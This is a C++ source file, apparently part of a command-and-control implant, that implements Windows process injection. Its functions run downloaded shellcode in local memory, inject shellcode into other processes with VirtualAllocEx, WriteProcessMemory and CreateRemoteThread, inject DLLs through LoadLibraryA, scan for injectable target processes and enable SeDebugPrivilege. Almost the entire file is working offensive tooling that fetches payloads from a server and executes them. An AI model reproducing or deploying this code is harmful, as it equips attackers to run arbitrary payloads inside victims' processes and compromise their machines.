#include "injection_tasks.h"
#include "../core/config.h"
#include "../utils/encoding.h"
#include "../core/communication.h"
#include "../tasks/file_tasks.h"

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <algorithm>

namespace Tasks {
namespace Injection {

    std::pair<bool, std::string> ExecuteLocalShellcode(char* shellcode, size_t shellcodeSize, bool captureOutput) {
        if (!ValidateShellcode(shellcode, shellcodeSize)) {
            return std::make_pair(false, "Shellcode validation failed");
        }

        HANDLE hOldStdout = NULL;
        HANDLE hReadPipe = NULL, hWritePipe = NULL;
        std::string output;

        // Set up output capture if requested
        if (captureOutput) {
            SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
            if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
                return std::make_pair(false, "Failed to create pipe for output capture");
            }

            hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
            if (!SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)) {
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
                return std::make_pair(false, "Failed to redirect stdout");
            }
        }

        // Allocate executable memory in the current process
        void* execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (execMemory == NULL) {
            if (captureOutput) {
                SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
            }
            return std::make_pair(false, "Failed to allocate memory for shellcode");
        }

        // Copy the shellcode into the allocated memory
        memcpy(execMemory, shellcode, shellcodeSize);

        // Change the memory protection to allow execution
        DWORD oldProtect;
        if (!VirtualProtect(execMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            if (captureOutput) {
                SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
            }
            return std::make_pair(false, "Failed to change memory protection");
        }

        // Create a thread to execute the shellcode
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
        if (hThread == NULL) {
            VirtualFree(execMemory, 0, MEM_RELEASE);
            if (captureOutput) {
                SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
            }
            return std::make_pair(false, "Failed to create execution thread");
        }

        // Wait for the shellcode to finish executing
        DWORD waitResult = WaitForSingleObject(hThread, 30000); // 30 second timeout
        CloseHandle(hThread);

        // Clean up memory
        VirtualFree(execMemory, 0, MEM_RELEASE);

        // Capture output if requested
        if (captureOutput) {
            // Close write end and restore stdout
            CloseHandle(hWritePipe);
            SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);

            // Read captured output
            DWORD bytesRead;
            char buffer[4096];
            while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                output.append(buffer, bytesRead);
            }
            CloseHandle(hReadPipe);
        }

        bool success = (waitResult == WAIT_OBJECT_0);
        std::string message = success ? "Shellcode executed successfully" : "Shellcode execution timed out or failed";

        return std::make_pair(success, captureOutput ? output : message);
    }

    InjectionResult InjectCreateRemoteThread(DWORD targetPid, const void* shellcode, size_t shellcodeSize) {
        if (!ValidateShellcode(shellcode, shellcodeSize)) {
            return InjectionResult(false, "Shellcode validation failed", targetPid);
        }

        // Open the target process
        HANDLE hTarget = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 
            FALSE, targetPid
        );

        if (!hTarget) {
            DWORD error = GetLastError();
            return InjectionResult(false, "Failed to open target process. Error: " + std::to_string(error), targetPid);
        }

        // Check architecture compatibility
        if (!AreArchitecturesCompatible(GetCurrentProcessId(), targetPid)) {
            CloseHandle(hTarget);
            return InjectionResult(false, "Architecture mismatch between processes", targetPid);
        }

        // Allocate memory in the target process
        LPVOID pRemoteCode = VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemoteCode) {
            DWORD error = GetLastError();
            CloseHandle(hTarget);
            PRINTF("VirtualAllocEx failed: %d\n", error);
            return InjectionResult(false, "Memory allocation failed in target process", targetPid);
        }

        // Write shellcode to target process
        if (!WriteProcessMemory(hTarget, pRemoteCode, shellcode, shellcodeSize, NULL)) {
            DWORD error = GetLastError();
            VirtualFreeEx(hTarget, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            PRINTF("WriteProcessMemory failed: %d\n", error);
            return InjectionResult(false, "Failed to write shellcode to target process", targetPid);
        }

        // Change memory protection to executable
        DWORD dummy;
        if (!VirtualProtectEx(hTarget, pRemoteCode, shellcodeSize, PAGE_EXECUTE_READ, &dummy)) {
            DWORD error = GetLastError();
            VirtualFreeEx(hTarget, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            PRINTF("VirtualProtectEx failed: %d\n", error);
            return InjectionResult(false, "Failed to change memory protection in target process", targetPid);
        }

        // Create remote thread to execute shellcode
        DWORD threadId = 0;
        HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, &threadId);
        if (hThread == NULL) {
            DWORD error = GetLastError();
            VirtualFreeEx(hTarget, pRemoteCode, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            PRINTF("CreateRemoteThread failed: %d\n", error);
            return InjectionResult(false, "Failed to create remote thread", targetPid);
        }

        // Wait for execution with timeout
        DWORD waitResult = WaitForSingleObject(hThread, 5000); // 5 second timeout
        CloseHandle(hThread);
        VirtualFreeEx(hTarget, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hTarget);

        bool success = (waitResult == WAIT_OBJECT_0);
        std::string message = success ? "Remote injection completed successfully" : "Remote injection timed out";

        return InjectionResult(success, message, targetPid, threadId);
    }

    InjectionResult InjectDLL(DWORD targetPid, const std::string& dllPath) {
        if (dllPath.empty() || !File::FileExists(dllPath)) {
            return InjectionResult(false, "DLL file does not exist: " + dllPath, targetPid);
        }

        HANDLE hTarget = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
            FALSE, targetPid
        );

        if (!hTarget) {
            DWORD error = GetLastError();
            return InjectionResult(false, "Failed to open target process. Error: " + std::to_string(error), targetPid);
        }

        // Allocate memory for DLL path
        SIZE_T pathSize = dllPath.length() + 1;
        LPVOID pRemotePath = VirtualAllocEx(hTarget, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemotePath) {
            CloseHandle(hTarget);
            return InjectionResult(false, "Memory allocation failed for DLL path", targetPid);
        }

        // Write DLL path to target process
        if (!WriteProcessMemory(hTarget, pRemotePath, dllPath.c_str(), pathSize, NULL)) {
            VirtualFreeEx(hTarget, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            return InjectionResult(false, "Failed to write DLL path to target process", targetPid);
        }

        // Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
        if (!pLoadLibrary) {
            VirtualFreeEx(hTarget, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            return InjectionResult(false, "Failed to get LoadLibraryA address", targetPid);
        }

        // Create remote thread to load DLL
        DWORD threadId = 0;
        HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, pLoadLibrary, pRemotePath, 0, &threadId);
        if (!hThread) {
            DWORD error = GetLastError();
            VirtualFreeEx(hTarget, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hTarget);
            return InjectionResult(false, "Failed to create remote thread for DLL injection", targetPid);
        }

        // Wait for DLL loading
        DWORD waitResult = WaitForSingleObject(hThread, 10000); // 10 second timeout
        CloseHandle(hThread);
        VirtualFreeEx(hTarget, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hTarget);

        bool success = (waitResult == WAIT_OBJECT_0);
        std::string message = success ? "DLL injection completed successfully" : "DLL injection timed out";

        return InjectionResult(success, message, targetPid, threadId);
    }

    ProcessInfo GetProcessInfo(DWORD processId) {
        ProcessInfo info;
        info.processId = processId;

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        if (hProcess) {
            // Get process name
            char processName[MAX_PATH] = { 0 };
            DWORD nameSize = MAX_PATH;
            if (QueryFullProcessImageNameA(hProcess, 0, processName, &nameSize)) {
                std::string fullPath(processName);
                size_t pos = fullPath.find_last_of("\\/");
                info.processName = (pos != std::string::npos) ? fullPath.substr(pos + 1) : fullPath;
            }

            // Get architecture
            BOOL isWow64 = FALSE;
            typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
            LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
                GetModuleHandleA("kernel32"), "IsWow64Process");
            
            if (fnIsWow64Process && fnIsWow64Process(hProcess, &isWow64)) {
                info.architecture = isWow64 ? "x86" : "x64";
            }

            CloseHandle(hProcess);
        }

        // Get parent process ID
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (pe32.th32ProcessID == processId) {
                        info.parentId = pe32.th32ParentProcessID;
                        if (info.processName.empty()) {
                            info.processName = pe32.szExeFile;
                        }
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }

        return info;
    }

    bool IsProcessSuitableForInjection(DWORD processId, const std::string& requiredArch) {
        if (processId == 0 || processId == 4) {
            return false; // System processes
        }

        ProcessInfo info = GetProcessInfo(processId);
        
        // Check architecture if specified
        if (!requiredArch.empty() && info.architecture != requiredArch) {
            return false;
        }

        // Try to open process with required permissions
        HANDLE hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
            FALSE, processId
        );

        if (hProcess) {
            CloseHandle(hProcess);
            return true;
        }

        return false;
    }

    std::vector<DWORD> FindProcessesByName(const std::string& processName, bool exactMatch) {
        std::vector<DWORD> processes;
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return processes;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string currentName(pe32.szExeFile);
                std::string searchName = processName;
                
                // Convert to lowercase for comparison
                std::transform(currentName.begin(), currentName.end(), currentName.begin(), ::tolower);
                std::transform(searchName.begin(), searchName.end(), searchName.begin(), ::tolower);
                
                bool match = exactMatch ? (currentName == searchName) : (currentName.find(searchName) != std::string::npos);
                
                if (match) {
                    processes.push_back(pe32.th32ProcessID);
                }
                
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return processes;
    }

    std::vector<DWORD> FindSuitableTargets(bool excludeElevated, const std::string& requiredArch) {
        std::vector<DWORD> targets;
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return targets;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                DWORD pid = pe32.th32ProcessID;
                
                if (IsProcessSuitableForInjection(pid, requiredArch)) {
                    // TODO: Add elevation check if excludeElevated is true
                    targets.push_back(pid);
                }
                
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return targets;
    }

    bool ValidateShellcode(const void* shellcode, size_t shellcodeSize) {
        if (!shellcode || shellcodeSize == 0) {
            return false;
        }

        // Basic size validation
        if (shellcodeSize > 1024 * 1024) { // 1MB limit
            PRINTF("[WARNING] Shellcode size exceeds safety limit: %zu bytes\n", shellcodeSize);
            return false;
        }

        if (shellcodeSize < 4) { // Minimum reasonable size
            PRINTF("[WARNING] Shellcode size too small: %zu bytes\n", shellcodeSize);
            return false;
        }

        // Check for null bytes at the beginning (could indicate corrupted shellcode)
        const unsigned char* bytes = (const unsigned char*)shellcode;
        if (bytes[0] == 0x00 && bytes[1] == 0x00) {
            PRINTF("[WARNING] Shellcode appears to start with null bytes\n");
        }

        return true;
    }

    std::pair<bool, std::string> ExecuteSetPrivShellcode(const json& task) {
        std::string shellcode = File::DownloadFilePayload(task);
        if (shellcode.empty()) {
            return std::make_pair(false, "Failed to download setpriv shellcode");
        }

        PRINTF("[DEBUG] Executing setpriv shellcode (%zu bytes)\n", shellcode.size());
        return ExecuteLocalShellcode((char*)shellcode.data(), shellcode.size(), false);
    }

    std::pair<bool, std::string> ExecuteListPrivsShellcode(const json& task) {
        std::string shellcode = File::DownloadFilePayload(task);
        if (shellcode.empty()) {
            return std::make_pair(false, "Failed to download listprivs shellcode");
        }

        PRINTF("[DEBUG] Executing listprivs shellcode (%zu bytes)\n", shellcode.size());
        return ExecuteLocalShellcode((char*)shellcode.data(), shellcode.size(), true);
    }

    InjectionResult ExecuteRemoteInjection(const json& task, DWORD targetPid) {
        if (!task.contains("file_id")) {
            return InjectionResult(false, "No shellcode file_id provided", targetPid);
        }

        std::string shellcode = File::DownloadFilePayload(task);
        if (shellcode.empty()) {
            return InjectionResult(false, "Failed to download shellcode payload", targetPid);
        }

        PRINTF("[DEBUG] Performing remote injection into PID %d (%zu bytes)\n", targetPid, shellcode.size());
        return InjectCreateRemoteThread(targetPid, shellcode.data(), shellcode.size());
    }

    bool HasInjectionPrivileges() {
        // Check if we have SeDebugPrivilege
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
            CloseHandle(hToken);
            return false;
        }

        PRIVILEGE_SET privs;
        privs.PrivilegeCount = 1;
        privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
        privs.Privilege[0].Luid = luid;
        privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL result = FALSE;
        PrivilegeCheck(hToken, &privs, &result);
        CloseHandle(hToken);

        return result != FALSE;
    }

    bool EnableSeDebugPrivilege() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            PRINTF("[DEBUG] Failed to open process token: %d\n", GetLastError());
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
            PRINTF("[DEBUG] Failed to lookup SeDebugPrivilege: %d\n", GetLastError());
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tokenPrivs;
        tokenPrivs.PrivilegeCount = 1;
        tokenPrivs.Privileges[0].Luid = luid;
        tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        DWORD error = GetLastError();
        CloseHandle(hToken);

        if (!result || error == ERROR_NOT_ALL_ASSIGNED) {
            PRINTF("[DEBUG] Failed to enable SeDebugPrivilege: %d\n", error);
            return false;
        }

        PRINTF("[DEBUG] SeDebugPrivilege enabled successfully\n");
        return true;
    }

    std::string GetCurrentArchitecture() {
#ifdef _WIN64
        return "x64";
#else
        return "x86";
#endif
    }

    bool AreArchitecturesCompatible(DWORD sourcePid, DWORD targetPid) {
        ProcessInfo sourceInfo = GetProcessInfo(sourcePid);
        ProcessInfo targetInfo = GetProcessInfo(targetPid);

        // x64 can inject into x86 (WoW64), but x86 cannot inject into x64
        if (sourceInfo.architecture == "x86" && targetInfo.architecture == "x64") {
            return false;
        }

        return true;
    }

    DWORD CreateSuspendedProcess(const std::string& executablePath, const std::string& commandLine) {
        if (!File::FileExists(executablePath)) {
            PRINTF("[ERROR] Executable not found: %s\n", executablePath.c_str());
            return 0;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        std::string cmdLine = executablePath;
        if (!commandLine.empty()) {
            cmdLine += " " + commandLine;
        }

        BOOL result = CreateProcessA(
            executablePath.c_str(),
            (LPSTR)cmdLine.c_str(),
            NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi
        );

        if (result) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            PRINTF("[DEBUG] Created suspended process: PID %d\n", pi.dwProcessId);
            return pi.dwProcessId;
        }
        else {
            PRINTF("[ERROR] Failed to create suspended process: %d\n", GetLastError());
            return 0;
        }
    }

    InjectionResult InjectProcessHollowing(DWORD targetPid, const void* payload, size_t payloadSize) {
        // Process hollowing is a complex technique that would require significant implementation
        // For now, return not implemented
        return InjectionResult(false, "Process hollowing not implemented", targetPid);
    }

} // namespace Injection
} // namespace Tasks